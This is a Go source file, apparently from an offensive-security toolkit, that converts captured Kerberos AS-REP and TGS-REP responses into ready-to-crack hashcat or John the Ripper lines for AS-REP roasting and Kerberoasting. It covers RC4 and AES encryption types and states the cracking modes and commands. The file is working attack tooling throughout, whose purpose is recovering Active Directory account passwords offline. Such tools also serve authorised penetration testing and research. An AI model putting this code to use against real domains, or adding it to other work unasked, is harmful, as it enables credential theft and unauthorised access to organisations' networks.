// SPDX-License-Identifier: AGPL-3.0-or-later

// Package krbroast assembles the hashcat crack line for the two dominant
// offline Kerberos credential attacks, from a captured KDC response:
//
//   - AS-REP roast (hashcat -m 18200): an AS-REP for a user with
//     "do not require Kerberos preauth" set leaks the enc-part encrypted with
//     the user's password-derived key. Line:
//     $krb5asrep$23$user@REALM:checksum$edata
//   - Kerberoast (hashcat -m 13100): a TGS-REP's service ticket enc-part is
//     encrypted with the service account's password-derived key. Line:
//     $krb5tgs$23$*user$REALM$spn*$checksum$edata
//
// kerberos_decode surfaces the pieces (the AS-REP/TGS-REP enc-part, the service
// ticket's enc-part + SPN); this closes the capture→crackable-hash gap by
// emitting the ready-to-crack line, exactly as netntlm_hashcat does for NTLM.
// The RC4 (etype 23) cipher is checksum(16) ‖ edata; that split is what hashcat
// expects. Pure offline transform; no network or device.
//
// # Wrap-vs-native judgement
//
// Native. It reuses the in-tree internal/kerberos AS-REP/TGS-REP + Ticket
// decoder and does a length split + string format. There is nothing to wrap.
//
// # Verifiable / no confidently-wrong output
//
// The line FORMAT is the canonical hashcat / impacket one; the cipher split is
// anchored to hand-built, spec-conformant AS-REP and TGS-REP DERs with known
// enc-parts (the EncryptedData parse itself is the same one verified against an
// impacket-built Ticket). Both encryption families are handled, matching
// impacket's GetUserSPNs / GetNPUsers exactly:
//
//   - RC4 (etype 23): cipher = checksum(16) ‖ edata. Kerberoast -m 13100,
//     AS-REP roast -m 18200.
//   - AES (etype 17/18): cipher = edata ‖ checksum(12) (the checksum is the
//     LAST 12 bytes). Kerberoast -m 19600 (AES128) / -m 19700 (AES256); the SPN
//     is `*`-wrapped alone and ':' → '~'. AES AS-REP roast has no standard
//     hashcat mode and is flagged for John the Ripper.
//
// A non-AS-REP/TGS-REP message, or any other etype, errors rather than emitting
// a mis-split line.
package krbroast

import (
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/xunholy/promptzero/internal/kerberos"
)

// Result is the assembled crack line.
type Result struct {
	Attack      string `json:"attack"`       // "AS-REP roast" / "Kerberoast"
	HashcatMode int    `json:"hashcat_mode"` // 18200 / 13100
	Principal   string `json:"principal,omitempty"`
	SPN         string `json:"spn,omitempty"`
	Realm       string `json:"realm,omitempty"`
	Line        string `json:"crack_line"`
	Note        string `json:"note,omitempty"`
}

// RoastLine decodes an AS-REP / TGS-REP (hex) and emits the hashcat crack line.
func RoastLine(messageHex string) (*Result, error) {
	r, err := kerberos.Decode(messageHex)
	if err != nil {
		return nil, fmt.Errorf("krbroast: %w", err)
	}
	switch r.MessageType {
	case 11: // AS-REP
		return asrepRoast(r)
	case 13: // TGS-REP
		return kerberoast(r)
	default:
		return nil, fmt.Errorf("krbroast: expected an AS-REP (11) or TGS-REP (13), got %s", r.MessageTypeName)
	}
}

func asrepRoast(r *kerberos.Result) (*Result, error) {
	user, realm := r.ClientName, r.Realm
	switch r.EncPartEType {
	case 23: // RC4 — checksum(16) ‖ edata, hashcat 18200.
		chk, edata, err := splitRC4(r.EncPartCipherHex)
		if err != nil {
			return nil, fmt.Errorf("krbroast: AS-REP enc-part: %w", err)
		}
		return &Result{
			Attack: "AS-REP roast", HashcatMode: 18200, Principal: user, Realm: realm,
			Line: fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s", user, realm, chk, edata),
			Note: "crack with: hashcat -m 18200 (AS-REP roast; the user had Kerberos pre-auth disabled)",
		}, nil
	case 17, 18: // AES — edata ‖ checksum(12). No standard hashcat mode; John cracks it.
		chk, edata, err := splitAES(r.EncPartCipherHex)
		if err != nil {
			return nil, fmt.Errorf("krbroast: AS-REP enc-part: %w", err)
		}
		return &Result{
			Attack: "AS-REP roast", Principal: user, Realm: realm,
			Line: fmt.Sprintf("$krb5asrep$%d$%s$%s$%s$%s", r.EncPartEType, user, realm, chk, edata),
			Note: "AES AS-REP roast (etype " + itoa(r.EncPartEType) + "); crack with John the Ripper (krb5asrep) — hashcat has no standard AES AS-REP mode",
		}, nil
	default:
		return nil, fmt.Errorf("krbroast: AS-REP enc-part is etype %d; supported: RC4 (23) / AES (17,18)", r.EncPartEType)
	}
}

func kerberoast(r *kerberos.Result) (*Result, error) {
	if r.Ticket == nil {
		return nil, fmt.Errorf("krbroast: TGS-REP carries no decodable service ticket")
	}
	user, realm := r.ClientName, r.Realm
	spn := strings.ReplaceAll(r.Ticket.ServiceName, ":", "~") // hashcat/impacket convention
	switch r.Ticket.EncType {
	case 23: // RC4 — checksum(16) ‖ edata, hashcat 13100.
		chk, edata, err := splitRC4(r.Ticket.CipherHex)
		if err != nil {
			return nil, fmt.Errorf("krbroast: service ticket enc-part: %w", err)
		}
		return &Result{
			Attack: "Kerberoast", HashcatMode: 13100, Principal: user, Realm: realm, SPN: spn,
			Line: fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s", user, realm, spn, chk, edata),
			Note: "crack with: hashcat -m 13100 (Kerberoast; the SPN's service account key)",
		}, nil
	case 17, 18: // AES — edata ‖ checksum(12); 19600 (AES128) / 19700 (AES256).
		chk, edata, err := splitAES(r.Ticket.CipherHex)
		if err != nil {
			return nil, fmt.Errorf("krbroast: service ticket enc-part: %w", err)
		}
		mode := 19600
		if r.Ticket.EncType == 18 {
			mode = 19700
		}
		return &Result{
			Attack: "Kerberoast", HashcatMode: mode, Principal: user, Realm: realm, SPN: spn,
			Line: fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s$%s", r.Ticket.EncType, user, realm, spn, chk, edata),
			Note: fmt.Sprintf("crack with: hashcat -m %d (AES Kerberoast, etype %d)", mode, r.Ticket.EncType),
		}, nil
	default:
		return nil, fmt.Errorf("krbroast: service ticket is etype %d; supported: RC4 (23) / AES (17,18)", r.Ticket.EncType)
	}
}

// splitRC4 splits an RC4 enc-part cipher into the leading 16-byte checksum and
// the remaining edata, as hashcat 18200 / 13100 expect.
func splitRC4(cipherHex string) (checksum, edata string, err error) {
	b, err := hex.DecodeString(cipherHex)
	if err != nil {
		return "", "", fmt.Errorf("cipher is not valid hex: %w", err)
	}
	if len(b) < 16 {
		return "", "", fmt.Errorf("cipher %d bytes — too short for a 16-byte checksum", len(b))
	}
	return hex.EncodeToString(b[:16]), hex.EncodeToString(b[16:]), nil
}

// splitAES splits an AES enc-part cipher into the trailing 12-byte checksum and
// the leading edata, as hashcat 19600 / 19700 expect.
func splitAES(cipherHex string) (checksum, edata string, err error) {
	b, err := hex.DecodeString(cipherHex)
	if err != nil {
		return "", "", fmt.Errorf("cipher is not valid hex: %w", err)
	}
	if len(b) < 12 {
		return "", "", fmt.Errorf("cipher %d bytes — too short for a 12-byte checksum", len(b))
	}
	return hex.EncodeToString(b[len(b)-12:]), hex.EncodeToString(b[:len(b)-12]), nil
}

func itoa(n int) string { return fmt.Sprintf("%d", n) }
